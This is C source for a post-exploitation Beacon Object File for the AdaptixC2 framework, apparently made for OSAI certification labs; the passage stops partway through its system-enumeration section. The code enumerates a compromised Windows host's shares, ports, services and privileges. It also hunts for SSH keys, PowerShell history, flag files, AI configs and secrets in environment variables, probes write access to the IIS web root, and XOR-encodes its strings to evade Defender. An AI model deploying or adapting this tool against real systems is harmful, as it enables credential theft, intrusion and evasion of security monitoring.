/*
 * osai_enum.c — OSAI local-host enumeration BOF
 *
 * A port of osep_enum.c (OSEP_enum.ps1 BOF) that preserves all eight
 * original enumeration sections and adds four OSAI / AI-300 quick-win
 * sections tuned to the recurring signals seen across the OSAI challenge
 * labs (Double Helix, Pipeline Breach, Iron Crown, Synthetic Siege):
 *
 *   1. Network shares                       (ported)
 *   2. Interesting files in C:\Users        (ported)
 *   3. Directory listings                   (ported)
 *   4. Flag files (local.txt / proof.txt)   (ported)
 *   5. Listening TCP ports + owning process (ported)
 *   6. IIS wwwroot write check              (ported)
 *   7. Sticky Notes + PowerShell history    (ported)
 *   8. Installed services (registry)        (ported)
 *   9. System & defenses quick-look         (OSAI)  hostname / OS / arch /
 *        domain-or-workgroup / current user / Defender realtime state /
 *        token privileges (SeImpersonate, SeDebug, SeTcb, ...)
 *  10. AI/ML artifacts & config secrets     (OSAI)  recursive search for
 *        model files (.pt/.pkl/.ckpt/.safetensors/.onnx/.gguf/...), AI
 *        config files (config.json, docker-compose.yml, .env, Modelfile,
 *        requirements.txt, ...) and AI-tool dirs (mlruns, ollama, n8n,
 *        langflow, huggingface, ...); opens small text configs in-process
 *        and scans for secret signatures (sk-, glpat-, AKIA, ghp_,
 *        -----BEGIN, password=, connection_string, mongodb://, ...).
 *  11. AI/ML listening services             (OSAI)  re-runs the TCP listener
 *        enum and labels every port in the known AI/ML service table
 *        (11434 Ollama, 5000 Flask/MLflow, 7860 Gradio, 3000 n8n/Gitea,
 *        5432 Postgres, 6379 Redis, 7687 Neo4j, 9200 Elasticsearch, ...).
 *  12. SSH keys + environment secrets       (OSAI)  per-user .ssh\ contents
 *        (id_rsa, id_ed25519, authorized_keys, known_hosts, ...) and
 *        C:\ProgramData\ssh\ (admin_authorized_keys, host keys, sshd_config);
 *        then scans the process environment block for variable names
 *        matching *_TOKEN / *_KEY / *_SECRET / *PASSWORD* / VAULT_* /
 *        CREDENTIAL / API / *_CONN* / AWS_* / GITLAB_* / GITHUB_*.
 *
 * Single in-process BOF, no child processes, no PowerShell — the same
 * OPSEC point as osep-enum. MITRE ATT&CK T1082/T1087/T1016/T1057/T1552/
 * T1555/T1496; ATLASAML-T0024 (ML artifact discovery) / T0049 (credential
 * harvesting from ML configs).
 *
 * Build (mingw cross-compiler):
 *   x86_64-w64-mingw32-gcc -c osai_enum.c -masm=intel -o osai_enum.x64.o
 *   i686-w64-mingw32-gcc   -c osai_enum.c -masm=intel -o osai_enum.x86.o
 *
 * Deploy the .o files into Extension-Kit/SAL-BOF/_bin/ and register the
 * `osai-enum` command in sal.axs (see OSAI-ENUM/README.md).
 */

#include <windows.h>
#include "beacon.h"
#include "osai_enc.h"   // XOR(0x5C)-encoded secret-signature strings (Defender OPSEC)

// ─── WIN32 IMPORTS ───────────────────────────────────────────────────────────

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$K32GetProcessImageFileNameW(HANDLE, LPWSTR, DWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT void    WINAPI KERNEL32$GetNativeSystemInfo(LPSYSTEM_INFO);
DECLSPEC_IMPORT LPWSTR  WINAPI KERNEL32$GetEnvironmentStringsW(void);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FreeEnvironmentStringsW(LPWSTR);

DECLSPEC_IMPORT int      __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT int      __cdecl MSVCRT$swprintf(wchar_t*, const wchar_t*, ...);
DECLSPEC_IMPORT size_t   __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT size_t   __cdecl MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int      __cdecl MSVCRT$wcscmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int      __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int      __cdecl MSVCRT$_wcsnicmp(const wchar_t*, const wchar_t*, size_t);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcsrchr(const wchar_t*, wchar_t);
DECLSPEC_IMPORT void*    __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT void*    __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT int      __cdecl MSVCRT$memcmp(const void*, const void*, size_t);

// ─── STRUCT DEFS (avoid including iphlpapi / lm headers) ─────────────────────

// MIB_TCPROW_OWNER_PID
typedef struct {
    DWORD dwState;
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
    DWORD dwRemoteAddr;
    DWORD dwRemotePort;
    DWORD dwOwningPid;
} _BOF_TCPROW;

typedef struct {
    DWORD      dwNumEntries;
    _BOF_TCPROW table[1];
} _BOF_TCPTABLE;

// TCP_TABLE_OWNER_PID_LISTENER = 4
#define BOF_TCP_OWNER_PID_LISTENER 4

DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetExtendedTcpTable(PVOID, PDWORD, BOOL, ULONG, DWORD, ULONG);

// SHARE_INFO_1
typedef struct {
    LPWSTR shi1_netname;
    DWORD  shi1_type;
    LPWSTR shi1_remark;
} _BOF_SHARE_INFO_1;

// WKSTA_INFO_100 (NetWkstaGetInfo level 100)
typedef struct {
    LPWSTR wki100_computername;
    LPWSTR wki100_langroup;
} _BOF_WKSTA_INFO_100;

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetShareEnum(LPWSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetWkstaGetInfo(LPWSTR, DWORD, LPBYTE*);

DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$GetTokenInformation(HANDLE, int, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$LookupPrivilegeNameW(LPCWSTR, PLUID, LPWSTR, LPDWORD);

// Token information class values we use
#define BOF_TOKEN_PRIVILEGES 3
#define BOF_SE_PRIVILEGE_ENABLED 0x00000002L

// ─── ___chkstk_ms no-op stub (LESSONS U3) ───────────────────────────────────
// gcc emits a call to ___chkstk_ms for any stack frame > ~4KB (here: the
// ported findStickyAndHistory holds 3× WIN32_FIND_DATAW + several wchar[MAX_PATH]
// arrays ≈ 5KB). The AdaptixC2/Outflank loader does NOT resolve it (U1 default
// branch), so an unresolved ___chkstk_ms makes the BOF fail to load. The beacon
// runs in the host thread on a pre-committed 1MB stack, so stack probing is
// unnecessary — this no-op just satisfies the reference. Must be non-static.
void ___chkstk_ms(void) {}
void __chkstk_ms(void) {}

// ─── HELPERS ─────────────────────────────────────────────────────────────────

// Wide to narrow conversion into caller-supplied buffer
static void w2a(const wchar_t* wide, char* out, int outSz) {
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, wide, -1, out, outSz, NULL, NULL);
}

// Narrow a counted wide span (no NUL in source) into a NUL-terminated narrow buf.
static void w2aN(const wchar_t* wide, int nch, char* out, int outSz) {
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, wide, nch, out, outSz, NULL, NULL);
    if (outSz > 0) out[outSz - 1] = 0;
}

// Check if a wide filename matches one of a set of extensions (case-insens).
// exts[] must be NULL-terminated.
static BOOL matchExt(const wchar_t* filename, const wchar_t** exts) {
    wchar_t* dot = MSVCRT$wcsrchr(filename, L'.');
    if (!dot) return FALSE;
    for (int i = 0; exts[i]; i++) {
        if (MSVCRT$_wcsicmp(dot, exts[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

// Match exact filenames (case-insens). names[] NULL-terminated.
static BOOL matchExact(const wchar_t* filename, const wchar_t** names) {
    for (int i = 0; names[i]; i++) {
        if (MSVCRT$_wcsicmp(filename, names[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

// Case-insensitive wide substring search (manual — no libc).
static BOOL wcs_contains_ci(const wchar_t* s, int slen, const wchar_t* needle) {
    int nlen = (int)MSVCRT$wcslen(needle);
    if (nlen == 0 || nlen > slen) return FALSE;
    for (int i = 0; i <= slen - nlen; i++) {
        int j = 0;
        for (; j < nlen; j++) {
            wchar_t a = s[i + j];
            wchar_t b = needle[j];
            if (a >= L'a' && a <= L'z') a -= 32;
            if (b >= L'a' && b <= L'z') b -= 32;
            if (a != b) break;
        }
        if (j == nlen) return TRUE;
    }
    return FALSE;
}

// Recursive file search up to maxDepth. Prints any file matching exts or
// exactNames (OSEP-enum original behaviour).
static void searchFilesRec(const wchar_t* dir, const wchar_t** exts,
                            const wchar_t** exactNames, int depth, int maxDepth) {
    if (depth > maxDepth) return;

    wchar_t pattern[MAX_PATH];
    MSVCRT$wcscpy(pattern, dir);
    MSVCRT$wcscat(pattern, L"\\*");

    WIN32_FIND_DATAW fd;
    HANDLE hFind = KERNEL32$FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
            MSVCRT$wcscmp(fd.cFileName, L"..") == 0)
            continue;

        wchar_t fullPath[MAX_PATH];
        MSVCRT$wcscpy(fullPath, dir);
        MSVCRT$wcscat(fullPath, L"\\");
        MSVCRT$wcscat(fullPath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            searchFilesRec(fullPath, exts, exactNames, depth + 1, maxDepth);
        } else {
            BOOL hit = FALSE;
            if (exts)       hit = matchExt(fd.cFileName, exts);
            if (!hit && exactNames) hit = matchExact(fd.cFileName, exactNames);
            if (hit) {
                char aBuf[MAX_PATH * 2];
                w2a(fullPath, aBuf, sizeof(aBuf));
                BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", aBuf);
            }
        }
    } while (KERNEL32$FindNextFileW(hFind, &fd));

    KERNEL32$FindClose(hFind);
}

// Print one level of subdirectories under a given path
static void listDirs(const wchar_t* path) {
    wchar_t pattern[MAX_PATH];
    MSVCRT$wcscpy(pattern, path);
    MSVCRT$wcscat(pattern, L"\\*");

    WIN32_FIND_DATAW fd;
    HANDLE hFind = KERNEL32$FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        char aBuf[MAX_PATH];
        w2a(path, aBuf, sizeof(aBuf));
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] Cannot open: %s\n", aBuf);
        return;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
            MSVCRT$wcscmp(fd.cFileName, L"..") == 0)
            continue;

        char aName[MAX_PATH];
        w2a(fd.cFileName, aName, sizeof(aName));
        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", aName);
    } while (KERNEL32$FindNextFileW(hFind, &fd));

    KERNEL32$FindClose(hFind);
}

// List every FILE (non-directory) under path, prefixed with [label].
static void listFilesIn(const wchar_t* path, const char* label) {
    wchar_t pattern[MAX_PATH];
    MSVCRT$wcscpy(pattern, path);
    MSVCRT$wcscat(pattern, L"\\*");

    WIN32_FIND_DATAW fd;
    HANDLE hFind = KERNEL32$FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
            MSVCRT$wcscmp(fd.cFileName, L"..") == 0)
            continue;

        wchar_t full[MAX_PATH];
        MSVCRT$wcscpy(full, path);
        MSVCRT$wcscat(full, L"\\");
        MSVCRT$wcscat(full, fd.cFileName);

        char aBuf[MAX_PATH * 2];
        w2a(full, aBuf, sizeof(aBuf));
        BeaconPrintf(CALLBACK_OUTPUT, "  [%s] %s\n", label, aBuf);
    } while (KERNEL32$FindNextFileW(hFind, &fd));

    KERNEL32$FindClose(hFind);
}

// ─── SECTION 1: NET SHARES ───────────────────────────────────────────────────

static void enumShares(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[1] NETWORK SHARES\n"
        "========================================\n");

    LPBYTE buf = NULL;
    DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;

    DWORD ret = NETAPI32$NetShareEnum(
        NULL, 1, &buf, (DWORD)-1,
        &entriesRead, &totalEntries, &resumeHandle);

    if (ret != 0 && ret != 234 /*ERROR_MORE_DATA*/) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] NetShareEnum failed: %lu\n", ret);
        return;
    }

    _BOF_SHARE_INFO_1* shares = (_BOF_SHARE_INFO_1*)buf;
    for (DWORD i = 0; i < entriesRead; i++) {
        char aName[256], aRemark[256];
        w2a(shares[i].shi1_netname, aName,   sizeof(aName));
        w2a(shares[i].shi1_remark,  aRemark, sizeof(aRemark));
        BeaconPrintf(CALLBACK_OUTPUT,
            "  %-20s  Type: %lu  Remark: %s\n",
            aName, shares[i].shi1_type, aRemark);
    }

    if (buf) NETAPI32$NetApiBufferFree(buf);
}

// ─── SECTION 2: INTERESTING FILES IN C:\USERS ────────────────────────────────

static void searchInterestingFiles(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[2] INTERESTING FILES IN C:\\Users\n"
        "  (xml, txt, pdf, xls/xlsx, doc/docx, log, exe, id_rsa, authorized_keys)\n"
        "========================================\n");

    const wchar_t* exts[] = {
        L".xml", L".txt", L".pdf", L".xls", L".xlsx",
        L".doc", L".docx", L".log", L".exe", NULL
    };
    const wchar_t* exact[] = {
        L"id_rsa", L"authorized_keys", NULL
    };

    searchFilesRec(L"C:\\Users", exts, exact, 0, 6);
}

// ─── SECTION 3: DIRECTORY LISTINGS ───────────────────────────────────────────

static void listDirectories(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[3] DIRECTORY LISTINGS\n"
        "========================================\n");

    const wchar_t* paths[] = {
        L"C:\\Program Files",
        L"C:\\Program Files (x86)",
        L"C:\\ProgramData",
        L"C:\\",
        NULL
    };

    for (int i = 0; paths[i]; i++) {
        char aBuf[MAX_PATH];
        w2a(paths[i], aBuf, sizeof(aBuf));
        BeaconPrintf(CALLBACK_OUTPUT, "\n  [%s]\n", aBuf);
        listDirs(paths[i]);
    }
}

// ─── SECTION 4: FLAG FILES ────────────────────────────────────────────────────

static void findFlags(void) {
    char b4[200];
    xdec(b4, E_BANNER_04, E_BANNER_04_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, b4);

    static wchar_t wLocal[16], wProof[16];
    xdec_w(wLocal, E_FLAG_LOCAL, E_FLAG_LOCAL_LEN);
    xdec_w(wProof, E_FLAG_PROOF, E_FLAG_PROOF_LEN);
    const wchar_t* exact[] = { wLocal, wProof, NULL };

    searchFilesRec(L"C:\\", NULL, exact, 0, 0);
    searchFilesRec(L"C:\\Users", NULL, exact, 0, 6);
}

// ─── SECTIONS 5 & 11: LISTENING TCP PORTS (shared) ───────────────────────────

// Known AI/ML service ports (OSAI lab-recurring).
static const char* aiPortName(DWORD port) {
    switch (port) {
        case 11434: return "Ollama";
        case 5000:  return "Flask/MLflow/Registry";
        case 5001:  return "Flask/Gitea";
        case 5005:  return "MLflow";
        case 5500:  return "LLM app";
        case 7860:  return "Gradio";
        case 3000:  return "n8n/Gitea/Grafana/Node";
        case 3010:  return "ML app";
        case 8000:  return "Django/FastAPI/Ollama-alt";
        case 8080:  return "HTTP API";
        case 8443:  return "HTTPS API";
        case 8501:  return "TensorFlow Serving";
        case 8888:  return "Jupyter";
        case 6006:  return "TensorBoard";
        case 4040:  return "pydbg/ML";
        case 3306:  return "MySQL";
        case 23306: return "MySQL";
        case 5432:  return "PostgreSQL";
        case 6379:  return "Redis";
        case 7474:  return "Neo4j HTTP";
        case 7687:  return "Neo4j Bolt";
        case 9090:  return "Prometheus";
        case 9091:  return "Pushgateway";
        case 9092:  return "Kafka";
        case 5672:  return "RabbitMQ AMQP";
        case 15672: return "RabbitMQ UI";
        case 6333:  return "ClickHouse";
        case 8123:  return "ClickHouse HTTP";
        case 9000:  return "MinIO/PHP-FPM";
        case 4317:  return "OTLP gRPC";
        case 4318:  return "OTLP HTTP";
        case 16686: return "Jaeger UI";
        case 8086:  return "InfluxDB";
        case 9200:  return "Elasticsearch";
        case 5601:  return "Kibana";
        case 19530: return "Milvus";
        case 27017: return "MongoDB";
        case 5050:  return "Registry/Gitea-alt";
        case 5051:  return "Registry";
        case 22:    return "SSH";
        case 5985:  return "WinRM HTTP";
        case 5986:  return "WinRM HTTPS";
        default:    return NULL;
    }
}

static void enumPorts(int aiOnly) {
    DWORD tableSize = 0;
    IPHLPAPI$GetExtendedTcpTable(NULL, &tableSize, FALSE, AF_INET,
                                  BOF_TCP_OWNER_PID_LISTENER, 0);

    _BOF_TCPTABLE* table = (_BOF_TCPTABLE*)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, tableSize);
    if (!table) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] HeapAlloc failed\n");
        return;
    }

    DWORD ret = IPHLPAPI$GetExtendedTcpTable(table, &tableSize, FALSE, AF_INET,
                                              BOF_TCP_OWNER_PID_LISTENER, 0);
    if (ret != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] GetExtendedTcpTable failed: %lu\n", ret);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, table);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "  %-22s %-8s  %s\n",
                 "Address:Port", "PID", "Process / Service");
    BeaconPrintf(CALLBACK_OUTPUT, "  %-22s %-8s  %s\n",
                 "------------", "---", "---------------");

    for (DWORD i = 0; i < table->dwNumEntries; i++) {
        _BOF_TCPROW* row = &table->table[i];

        BYTE* addr = (BYTE*)&row->dwLocalAddr;
        DWORD port  = ((row->dwLocalPort & 0xFF) << 8) |
                      ((row->dwLocalPort >> 8) & 0xFF);
        DWORD pid   = row->dwOwningPid;

        const char* svc = aiPortName(port);
        if (aiOnly && !svc) continue;

        char addrStr[64];
        MSVCRT$sprintf(addrStr, "%u.%u.%u.%u:%u",
                       addr[0], addr[1], addr[2], addr[3], port);

        char procName[MAX_PATH] = "<unknown>";
        HANDLE hProc = KERNEL32$OpenProcess(
            PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hProc) {
            wchar_t wPath[MAX_PATH];
            if (KERNEL32$K32GetProcessImageFileNameW(hProc, wPath, MAX_PATH)) {
                wchar_t* slash = MSVCRT$wcsrchr(wPath, L'\\');
                w2a(slash ? slash + 1 : wPath, procName, sizeof(procName));
            }
            KERNEL32$CloseHandle(hProc);
        }

        if (svc)
            BeaconPrintf(CALLBACK_OUTPUT, "  %-22s %-8lu  %s  [%s]\n",
                         addrStr, pid, procName, svc);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "  %-22s %-8lu  %s\n",
                         addrStr, pid, procName);
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, table);
}

static void enumListeningPorts(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[5] LISTENING TCP PORTS\n"
        "========================================\n");
    enumPorts(0);
}

// ─── SECTION 6: IIS WWWROOT WRITE CHECK ──────────────────────────────────────

static void checkIISWrite(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[6] IIS WWWROOT WRITE CHECK\n"
        "========================================\n");

    const wchar_t* testPath = L"C:\\inetpub\\wwwroot\\bof_write_test.tmp";

    WIN32_FIND_DATAW fd;
    HANDLE hCheck = KERNEL32$FindFirstFileW(L"C:\\inetpub\\wwwroot", &fd);
    if (hCheck == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "  C:\\inetpub\\wwwroot does not exist.\n");
        return;
    }
    KERNEL32$FindClose(hCheck);

    HANDLE hFile = KERNEL32$CreateFileW(
        testPath,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  No write access to C:\\inetpub\\wwwroot.\n");
        return;
    }

    const char* data = "test";
    DWORD written = 0;
    KERNEL32$WriteFile(hFile, data, 4, &written, NULL);
    KERNEL32$CloseHandle(hFile);
    KERNEL32$DeleteFileW(testPath);

    char aspx[200];
    xdec(aspx, E_ASPX_OK, E_ASPX_OK_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, aspx);
}

// ─── SECTION 7: STICKY NOTES + PS HISTORY ────────────────────────────────────

static void findStickyAndHistory(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[7] STICKY NOTES + POWERSHELL HISTORY\n"
        "========================================\n");

    WIN32_FIND_DATAW fd;
    HANDLE hUsers = KERNEL32$FindFirstFileW(L"C:\\Users\\*", &fd);
    if (hUsers == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] Cannot enumerate C:\\Users\n");
        return;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (MSVCRT$wcscmp(fd.cFileName, L".") == 0 ||
            MSVCRT$wcscmp(fd.cFileName, L"..") == 0 ||
            MSVCRT$_wcsicmp(fd.cFileName, L"Public") == 0 ||
            MSVCRT$_wcsicmp(fd.cFileName, L"Default") == 0)
            continue;

        wchar_t userDir[MAX_PATH];
        MSVCRT$wcscpy(userDir, L"C:\\Users\\");
        MSVCRT$wcscat(userDir, fd.cFileName);

        // PowerShell history
        wchar_t histPath[MAX_PATH];
        MSVCRT$wcscpy(histPath, userDir);
        MSVCRT$wcscat(histPath,
            L"\\AppData\\Roaming\\Microsoft\\Windows\\"
            L"PowerShell\\PSReadLine\\ConsoleHost_history.txt");

        WIN32_FIND_DATAW fdHist;
        HANDLE hHist = KERNEL32$FindFirstFileW(histPath, &fdHist);
        if (hHist != INVALID_HANDLE_VALUE) {
            char aPath[MAX_PATH * 2];
            w2a(histPath, aPath, sizeof(aPath));
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [PSHistory] %s\n", aPath);
            KERNEL32$FindClose(hHist);
        }

        // Sticky Notes — search the LocalState folder for plum.sqlite or *.sqlite
        wchar_t stickyBase[MAX_PATH];
        MSVCRT$wcscpy(stickyBase, userDir);
        MSVCRT$wcscat(stickyBase,
            L"\\AppData\\Local\\Packages\\"
            L"Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\*");

        WIN32_FIND_DATAW fdSticky;
        HANDLE hSticky = KERNEL32$FindFirstFileW(stickyBase, &fdSticky);
        if (hSticky != INVALID_HANDLE_VALUE) {
            wchar_t stickyDir[MAX_PATH];
            MSVCRT$wcscpy(stickyDir, userDir);
            MSVCRT$wcscat(stickyDir,
                L"\\AppData\\Local\\Packages\\"
                L"Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState");

            do {
                if (fdSticky.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                wchar_t fullSticky[MAX_PATH];
                MSVCRT$wcscpy(fullSticky, stickyDir);
                MSVCRT$wcscat(fullSticky, L"\\");
                MSVCRT$wcscat(fullSticky, fdSticky.cFileName);
                char aStickyPath[MAX_PATH * 2];
                w2a(fullSticky, aStickyPath, sizeof(aStickyPath));
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [StickyNotes] %s\n", aStickyPath);
            } while (KERNEL32$FindNextFileW(hSticky, &fdSticky));
            KERNEL32$FindClose(hSticky);
        }

    } while (KERNEL32$FindNextFileW(hUsers, &fd));

    KERNEL32$FindClose(hUsers);
}

// ─── SECTION 8: SERVICES (REGISTRY) ─────────────────────────────────────────

static void enumServices(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n========================================\n"
        "[8] INSTALLED SERVICES (registry)\n"
        "========================================\n");

    HKEY hKey = NULL;
    LONG ret = ADVAPI32$RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services",
        0, KEY_READ, &hKey);

    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [!] RegOpenKeyExW failed: %ld\n", ret);
        return;
    }

    wchar_t name[256];
    DWORD nameLen = 256;
    DWORD index   = 0;

    while (ADVAPI32$RegEnumKeyExW(
               hKey, index++, name, &nameLen,
               NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        char aName[256];
        w2a(name, aName, sizeof(aName));
        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", aName);
        nameLen = 256;
    }

    ADVAPI32$RegCloseKey(hKey);
}

// ─── SECTION 9: SYSTEM & DEFENSES ───────────────────────────────────────────

static void systemAndDefenses(void) {
    char b9[200];
    xdec(b9, E_BANNER_09, E_BANNER_09_LEN);
    BeaconPrintf(CALLBACK_OUTPUT, b9);

    // Computer name + domain/workgroup (NetWkstaGetInfo level 100)
    LPBYTE wbuf = NULL;
    if (NETAPI32$NetWkstaGetInfo(NULL, 100, &wbuf) == 0 && wbuf) {
        _BOF_WKSTA_INFO_100* wk = (_BOF_WKSTA_INFO_100*)wbuf;
        char host[256], domain[256];
        w2a(wk->wki100_computername, host,   sizeof(host));
        w2a(wk->wki100_langroup,     domain, sizeof(domain));
        BeaconPrintf(CALLBACK_OUTPUT, "  Host   : %s\n", host);
        BeaconPrintf(CALLBACK_OUTPUT, "  Domain : %s\n", domain);
        NETAPI32$NetApiBufferFree(wbuf);
    }

    // Current user (USERNAME from the process env — GetUserNameW not imported)
    {
        LPWSTR env = KERNEL32$GetEnvironmentStringsW();
        if (env) {
            LPWSTR p = env;
            wchar_t un[256]; un[0] = 0;
            while (*p) {
                if (MSVCRT$_wcsnicmp(p, L"USERNAME=", 9) == 0) {
                    MSVCRT$wcscpy(un, p + 9);
                    break;
                }
                while (*p) p++; p++;
            }
            if (un[0]) {
                char user[256];
                w2a(un, user, sizeof(user));
                BeaconPrintf(CALLBACK_OUTPUT, "  User   : %s\n", user);
            }
            KERNEL32$FreeEnvironmentStringsW(env);
        }
    }

    // Architecture
    {
        SYSTEM_INFO si;
        KERNEL32$GetNativeSystemInfo(&si);
        const char* arch = "unknown";
        switch (si.wProcessorArchitecture) {
            case 9:  arch = "x64";   break;
            case 0:  arch = "x86";   break;
            case 12: arch = "ARM64"; break;
            case 5:  arch = "ARM";   break;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "  Arch   : %s\n", arch);
    }

    // OS name / build / display version (registry)
    {
        HKEY hOS = NULL;
        if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                0, KEY_READ, &hOS) == ERROR_SUCCESS) {
            wchar_t wv[256];
            DWORD vt, vlen;
            char prod[256] = {0}, build[64] = {0}, disp[64] = {0};

            vlen = sizeof(wv);
            if (ADVAPI32$RegQueryValueExW(hOS, L"ProductName", NULL,
